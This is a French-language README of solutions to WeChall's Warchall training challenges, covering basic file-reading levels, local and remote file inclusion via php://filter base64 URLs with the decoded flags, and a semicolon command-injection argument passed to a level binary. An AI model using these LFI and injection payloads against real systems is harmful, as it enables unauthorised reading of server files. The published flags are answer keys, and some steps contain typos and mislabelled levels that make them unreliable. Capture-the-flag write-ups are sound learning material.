# Wechall_SYS1
## Training: Warchall - The Beginning
##### Ce repository contient les solutions aux différents niveaux du challenge Wechall_SYS1. 

La commande `ls -R` permet de lister de manière récursive les fichiers et les répertoires dans un répertoire. Cette commande permet d'avoir une emsemble de path pour les soltions avec les bonnes permissions.
    
1. **Level 0:**
   
   + La solution pour le Level 0 est :

   `cat /home/level/00_welcome`

2. **Level 1:**
   
   + La solution pour le Level 1 est :
     
   ` cd /home /level/01_choice_tree` .La soution est dans `cd. /blue/hats/grey/soltion/patience`

   `cat SOLUTION.txt`
   
3. **Level 2:**
   
   + La solution pour le Level 2 est :

  `cd / home/level/02/.porb$`
  `cat .solution`

4. **Level 3:**
   
   + La solution pour le Level 3 est :

   `cd /home/level/03$` puis avec la commande `ls -la`
   `cat .bash_history`

5. **Level 4:**
   
   + La solution pour le Level 4 est "AndOfCourseIDoKnowChown".

   `~/level/04_kwisatz$`
   `cat README2.md`

6. **Level 5:**
   
   + La solution pour le Level 3 est :

   `cd /home/level/05_privacy$` et avec la commande `ls -la`
   `cat README.md`

## 	Warchall: Live LFI && Warchall: Live RFI : Level 14&15

  ##### RFI (Remote File Inclusion) et LFI (Local File Inclusion) sont des vulnérabilités de sécurité liées à la gestion des fichiers dans les applications web.
  
### 1.LFI (Local File Inclusion) Challenge

+ Acceder au lien du challenge `Live LFI`
  
+ Acceder à la page `https://lfi.warchall.net/` et de choisir une langue UK ou DE
  
+ Une fois avoir fait cet etape, URL est ainsi `https://lfi.warchall.net/index.php?lang=de `
  
  - Avec le LFI qui permet l'inclusiion de fichiers locaux et pour extraire cette vulnerabilté, il faut utliser `php://filter` mais dans notre cas, nous voulons avoir la `solution.php`. Ainsi voici les demarches :
    
    - `https://lfi.warchall.net/index.php?lang=` en supprimant `de`
    - Le wrapper `php://filter/convert.base64-encode/resource=` avec `solution.php` comme cible
    - Nous allons ainsi executer `https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php`
    - En sortie, nous aurons un code en Base64 avec la methode `php://filter/convert.base64-encode/resource=`
      
+ Le code obtenu est  `PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K`

+ Decodage code base64
  - Le premier methode, c'est avec la commande
    ```bash
      echo 'PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcg...' | base64 -d
      ```
  - Le deuxieme methode c'est avec les online Decode and Encode Base64 comme sur (https://www.base64decode.org/) . Nous pouvons ainsi obtenier un code en HTML et Php comme solution :
 
```   
<html>
<body>
<pre style="color:#000;">teh falg si naer!</pre>
<pre style="color:#fff;">the flag is near!</pre>
</body>
</html>
<?php                  #   YOUR_TROPHY 
return 'SteppinStones42Pie'; # <-´ ?>
```

### 2.RFI (Remote File Inclusion) Challenge

+ Acceder au lien du challenge `Live RFI`
+ Acceder à la page `https://rfi.warchall.net/` et de choisir une langue EN ou DE
+ Une fois avoir fait cet etape, URL est ainsi `https://rfi.warchall.net/index.php?lang=en`
  
    - Avec le RFI qui permet d'exploiter une faille pour inclure à distance des fichiers sur le serveur, généralement des scripts, pour exécuter du code à distance sur le serveur Web. Il faut également utliser `php://filter` qui est une fonctionnalité de PHP qui permet de manipuler et de filtrer des flux de données
    - `https://rfi.warchall.net/index.php?lang=en` en supprimant `en`
    - Il faut inserer le filtre `https://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php`
    - Nous pouvons ainsi obtenir un code en base64

+ Le code obtenu est `PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K `

+ Decodage code base64 avec la commande ou les online Decode and Encode Base64:
  
  ```bash
      echo 'PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K ' | base64 -d
  ```
  
 ```  
<html>
<body>
<pre>NOTHING HERE????</pre>
</body>
</html>
<?php return 'Low_H4NGING_Fruit'; ?>
 ```

+ Nous pouvons ainsi obtenier un code en HTML et Php comme solution.



## Warchall: Choose your Path `/home/level/10/`

+ il faut acceder au level 10 par la commande `cd /home/level/10_choose_your_Path`
  
+ dans ~/home/level/10_choose_your_Path$ , if faut voir les contenu avec `ls -la`
+ Il faut acceder et executer fichier `./charp "solution.txt; cat solution.txt > ~/solutionPath1.txt" ` et `cd ~`
  
+ `cat solutionPath1.txt` pour voir le contenu du fichier solutionPath1.txt
  
+ L'execution du script `./charp`
  
+ `./charp "solution.txt; cat solution.txt > ~/solutionPath1.txt" ` est une injection des commandes après le point-virgule dans une commande shell.

+ `./charp "solution.txt; cat solution.txt > ~/solutionPath1.txt" `
  
   - `./charp ` : Cela exécute le fichier exécutable appelé "charp" dans le répertoire courant `./`
   - ` "solution.txt; cat solution.txt > ~/solutionPath1.txt" ` : C'est l'argument fourni à la commande "charp".
      - `solution.txt` : C'est une chaîne de caractères représentant un fichier appelé "solution.txt"
      - ` cat solution.txt > ~/solutionPath1.txt ` : C'est une deuxième commande qui sera exécutée après le point-virgule. Elle utilise la commande cat pour afficher le contenu du fichier "solution.txt" et redirige la sortie (>) vers un nouveau fichier appelé "solutionPath1.txt" dans le répertoire personnel de l'utilisateur `~`
